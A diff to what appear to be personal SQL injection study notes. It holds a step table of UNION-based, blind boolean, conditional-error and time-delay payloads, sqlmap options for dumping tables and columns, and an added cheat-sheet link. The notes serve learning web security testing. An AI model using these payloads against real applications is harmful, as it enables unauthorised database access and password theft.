@@ -16,8 +16,8 @@ The figure above summarizes the syntax for commenting in various SQL DB. Do note
 |1|Identify instances where application access DB| Look at URL param, cookies, POST data, HTTP headers|
 |2|Try injecting SQL| Start with single quotes, concatenator characters, eg: `' 'FOO`|
 |3|Determine no. of cols| `' UNION SELECT NULL -- -`, `' UNION SELECT NULL,NULL -- -` ... until there's no error|
-|4.1|Determine which cols have string data type| `' UNION SELECT 'a', 'b', 'c' -- -`|
-|4.2|Determine which cols have numeric data type| `' UNION SELECT 4, 5, 6 -- -`|
+|4.1|Determine which cols have string data type| `' UNION SELECT 'a', NULL, NULL -- -`, `' UNION SELECT NULL, 'a', NULL -- -`, `' UNION SELECT NULL, NULL, 'a' -- -` ... until there's no error |
+|4.2|Determine which cols have numeric data type| `' UNION SELECT 1, NULL, NULL -- -`, `' UNION SELECT NULL, 1, NULL -- -`, `' UNION SELECT NULL, NULL, 1 -- -`... until there's no error|
 |4.3|Use conditional responses if there's no direct method of transmitting data|`admin' and ASCII(SUBSTRING(password,1,1))=113 -- -` login succeeds means first char for password is `q`|
 |4.4.1|Use conditional errors if there's no noticeable effect on application behavior|`SELECT 1/0 FROM dual WHERE (SELECT username FROM users WHERE username = 'alice') = 'alice'`. dual is default dummy table present in most DB. If query has error, means `alice` is a valid username|
 |4.4.2|Conditional errors (time delay)|`' UNION SELECT IF(ASCII(SUBSTRING(@@version,1,1))=49,BENCHMARK(5000000,SHA1('dummy_data')),NULL),NULL,NULL -- -`. If first char of database version is `1` (ASCII: 49), will have delay in server's response.
@@ -49,3 +49,6 @@ The figure above summarizes the syntax for commenting in various SQL DB. Do note
 -T table_name --columns: show all columns of the db
 -C column1,column2  --dump: dump all the contents of the columns
 ```
+### Good resources
+
+[Burpsuite SQL Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
